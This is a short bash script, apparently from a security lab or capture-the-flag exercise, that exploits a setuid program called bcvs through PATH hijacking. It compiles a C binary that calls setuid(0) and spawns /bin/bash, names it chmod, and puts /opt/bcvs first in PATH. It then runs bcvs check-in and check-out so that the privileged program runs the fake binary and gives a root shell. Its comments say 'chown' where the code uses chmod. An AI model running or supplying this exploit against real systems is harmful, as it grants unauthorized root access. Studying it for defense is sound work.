#!/bin/bash

#create a short c file to change setuid called chown, which will be executed when chown is executed
echo "int main(){setuid(0); system(\"/bin/bash\"); return 0;}" > chmod.c

#compile chown.c to executable chown. make sure it is executable
gcc -o chmod chmod.c
chmod 777 chmod

#change PATH variable to look at /opt/bcvs first
export PATH=/opt/bcvs:$PATH
cd /opt/bcvs

#create a file to put into bcvs and run
touch file1
./bcvs ci file1
./bcvs co file1

